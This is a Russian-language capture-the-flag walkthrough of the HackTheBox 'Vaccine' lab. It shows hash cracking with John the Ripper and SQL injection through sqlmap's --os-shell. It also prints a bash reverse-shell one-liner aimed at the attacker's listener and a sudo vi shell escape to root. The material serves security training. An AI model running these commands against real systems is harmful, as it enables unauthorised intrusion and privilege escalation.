# HackTheBox---Vaccine Writeup

## Краткая сводка (Summary)
* **Целевая ОС:** Linux (Ubuntu)
* **Вектор входа:** Анонимный FTP-доступ -> Извлечение бэкапа -> Взлом хэша архива (John the Ripper) -> Обнаружение учетных данных администратора.
* **Закрепление (Проверенная уязвимость):** Аутентифицированная SQL-инъекция в `dashboard.php` через параметр `search` -> Выполнение команд через `sqlmap --os-shell`.
* **Повышение привилегий (Privilege Escalation):** Извлечение пароля БД из конфигов -> Вход по SSH -> Эксплуатация уязвимости конфигурации `sudo` (Misconfiguration в правах на запуск `vi`).


## Разведка

### Сканирование портов
Начинаю со сканирования стандартных портов с указанием версий обнаруженных сервисов:

```bash
nmap -sV 10.129.209.236
```

### Результат
```TEXT
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
22/tcp open     ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
53/tcp filtered domain
80/tcp open     http    Apache httpd 2.4.41
```

### Анализ
Решение по шагам:

1. Besides SSH and HTTP, what other service is hosted on this box?

Ответ: FTP (по выводу выше виден ответ)

2. This service can be configured to allow login with any password for specific username. What is that username?

Ответ: anonymous (Стандартный логин для гостевого беспарольного доступа)

3. What is the name of the file downloaded over this service?
* Для того чтобы узнать имя файла, надо подключиться к хосту и проверить корневую директорию:

```bash
ftp 10.129.209.236
```

Подключаемся с помощью логина `anonymous`.
* Просмотр директории:
```TEXT
ftp> ls
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
```
Ответ: backup.zip

4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

Ответ: zip2john

## Получение первоначального доступа (Initial Access)

5. What is the password for the admin user on the website?
Для того чтобы узнать пароль от пользователя admin, необходимо скачать файл backup.zip:
ftp> get backup.zip

Файл зашифрован, извлекаем хэш:
```bash
zip2john backup.zip > zip_hash.txt
```

Взламываем хэш с помощью john:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
741852963        (backup.zip)
```

Разархивируем скачанный архив с помощью найденного пароля и открываем файл index.php, нас интересует строчка:
```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
```

Указан хэш пароля и тип шифрования, взламываем с помощью john:
```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt
```
Ответ: qwerty789

## Эксплуатация уязвимости (Exploitation)

6. What option can be passed to sqlmap to try to get command execution via the sql injection?
Ответ: --os-shell

7. What program can the postgres user run as root using sudo?
Для того чтобы узнать, какую программу может запускать пользователь postgres, необходимо под ним авторизоваться. Узнаем пароль.

Устанавливаем на прослушивание 444 порт на атакующей машине:
```bash
nc -lvnp 444
```
С помощью sqlmap запускаем shell:
```bash
sqlmap -u "http://10.129.95.174/dashboard.php?search=1" --cookie="PHPSESSID=ji4lr6ibdfcfna11fbpe4qsurs" --os-shell
```
Вводим скрипт для перехвата атакующей машиной:
```bash
bash -c "bash -i >& /dev/tcp/ip атакующей машины/444 0>&1"
```
Переводим шелл из неинтерактивного режима в интерактивный:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```
Теперь мы можем найти флаг в папке пользователя. Файл с флагом лежит по пути: /var/lib/postgresql/user.txt

Файл с паролем от postgres находится в каталоге /var/www/html/dashboard.php:
```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```
Теперь можно заходить по SSH под пользователем postgres:
Вводим команду sudo -l и узнаем, какую программу postgres может запускать с повышенными правами:

User postgres may run the following commands on vaccine:
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

Ответ: vi

## Повышение привилегий (Privilege Escalation)

8. Находим флаг пользователя root:
Для этого необходимо повысить привилегии.
Устанавливаем размеры терминала для корректного отображения:
```bash
stty rows 24 cols 80
```
В открытом файле /etc/postgresql/11/main/pg_hba.conf в редакторе vi вводим:
set shell=/bin/sh
shell
Получаем права root. Флаг лежит в корне пользователя /root/root.txt.
